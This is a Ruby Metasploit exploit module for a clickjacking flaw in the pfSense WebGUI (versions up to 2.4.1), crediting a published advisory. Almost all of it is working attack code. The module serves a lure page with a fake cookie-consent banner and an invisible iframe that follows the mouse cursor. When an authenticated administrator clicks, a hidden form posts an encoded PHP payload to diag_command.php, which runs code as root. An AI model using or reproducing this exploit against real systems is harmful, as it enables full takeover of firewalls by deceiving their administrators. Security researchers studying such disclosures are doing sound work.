# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::HttpServer::HTML
 
  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;            => &#039;Clickjacking Vulnerability In CSRF Error Page pfSense&#039;,
        &#039;Description&#039;     => %q{
          This module exploits a Clickjacking vulnerability in pfSense <= 2.4.1.
 
          pfSense is a free and open source firewall and router. It was found that the
          pfSense WebGUI is vulnerable to Clickjacking. By tricking an authenticated admin
          into interacting with a specially crafted webpage it is possible for an attacker
          to execute arbitrary code in the WebGUI. Since the WebGUI runs as the root user,
          this will result in a full compromise of the pfSense instance.
        },
        &#039;Author&#039;          => &#039;Yorick Koster&#039;,
        &#039;Payload&#039;         => { &#039;BadChars&#039; => &#039;"&#039; },
        &#039;License&#039;         => MSF_LICENSE,
        &#039;References&#039;      =>
          [
            [&#039;URL&#039;, &#039;https://securify.nl/en/advisory/SFY20171101/clickjacking-vulnerability-in-csrf-error-page-pfsense.html&#039;],
            [&#039;URL&#039;, &#039;https://doc.pfsense.org/index.php/2.4.2_New_Features_and_Changes&#039;]
          ],
        &#039;DefaultOptions&#039;  =>
          {
            &#039;EXITFUNC&#039;    => &#039;process&#039;
          },
        &#039;Arch&#039;            => ARCH_PHP,
        &#039;Platform&#039;        => &#039;php&#039;,
        &#039;Targets&#039;         =>
          [
            [ &#039;pfSense <= 2.4.1&#039;, { &#039;auto&#039; => false } ]
          ],
        &#039;DefaultTarget&#039;   => 0,
        &#039;DisclosureDate&#039;  => &#039;Nov 21 2017&#039;
      )
    )
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the web application&#039;, &#039;https://192.168.1.1&#039;])
      ]
    )
  end
 
  def js_file
    @js ||= lambda {
      path = File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;pfsense_clickjacking&#039;, &#039;cookieconsent.min.js&#039;)
      return File.read(path)
    }.call
  end
 
  def css_file
    @css ||= lambda {
      path = File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;pfsense_clickjacking&#039;, &#039;cookieconsent.min.css&#039;)
      return File.read(path)
    }.call
  end
 
  def background_file
    @background ||= lambda {
      path = File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;pfsense_clickjacking&#039;, &#039;background.jpg&#039;)
      return File.read(path)
    }.call
  end
 
  def on_request_uri(cli, request)
    print_status("GET #{request.uri} #{request.headers[&#039;User-Agent&#039;]}")
 
    resp = create_response(200, "OK")
    if request.uri =~ /\.js$/
      resp.body = js_file
      resp[&#039;Content-Type&#039;] = &#039;text/javascript&#039;
 
    elsif request.uri =~ /\.css$/
      resp.body = css_file
      resp[&#039;Content-Type&#039;] = &#039;text/css&#039;
 
    elsif request.uri =~ /\.jpg$/
      resp.body = background_file
      resp[&#039;Content-Type&#039;] = &#039;image/jpg&#039;
 
    else
      if datastore[&#039;TARGETURI&#039;].end_with? &#039;/&#039;
        url = datastore[&#039;TARGETURI&#039;] + &#039;diag_command.php&#039;
      else
        url = datastore[&#039;TARGETURI&#039;] + &#039;/diag_command.php&#039;
      end
      framename = rand_text_alpha(16)
      divname = rand_text_alpha(16)
      resp.body = %Q|<!DOCTYPE html>
<html>
<meta charset="utf-8">
<link rel="stylesheet" type="text/css" href="#{get_resource.chomp(&#039;/&#039;)}/cookieconsent.min.css" />
<script src="#{get_resource.chomp(&#039;/&#039;)}/cookieconsent.min.js"></script>
<script>
window.addEventListener("load", function(){
window.cookieconsent.initialise({
        "palette": {
                "popup": {
                        "background": "#000",
                        "text": "#0f0"
                },
                "button": {
                        "background": "#0f0"
                }
        },
        "position": "top",
        "static": true
        });
});
</script>
<script>
document.cookie = &#039;cookieconsent_status=; expires=Thu, 01 Jan 1970 00:00:01 GMT;&#039;;
window.addEventListener(&#039;load&#039;, function(){
        document.forms[0].post.click();
        document.onmousemove = function(e) {
                var e = e \|\| window.event;
                var s = document.getElementById(&#039;#{divname}&#039;);
                s.style.left  = (e.clientX - 10) + &#039;px&#039;;
                s.style.top = (e.clientY - 5) + &#039;px&#039;;
        };
});
</script>
<body style="background-image:url(#{get_resource.chomp(&#039;/&#039;)}/background.jpg);background-size:cover;">
<div id="#{divname}" style="position:absolute;z-index:10;border:none;width:20px;height:10px;overflow:hidden;opacity:0.0;">
<iframe src="about:blank" name="#{framename}" sandbox="allow-forms" border="no" scrolling="no" width="800" height="800" style="width:400px;height:800px;margin-top:-70px;margin-left:-40px;"></iframe>
</div>
<div style="display:none">
<form action="#{url}" method="POST" enctype="multipart/form-data" target="#{framename}">
        <input type="hidden" name="txtPHPCommand" value="#{payload.encoded}" />
        <input type="hidden" name="submit" value="EXECPHP" />
        <input type="submit" name="post"/>
</form>
</div>
</body>
</html>
|
      resp[&#039;Content-Type&#039;] = &#039;text/html&#039;
    end
 
    cli.send_response(resp)
  end
end

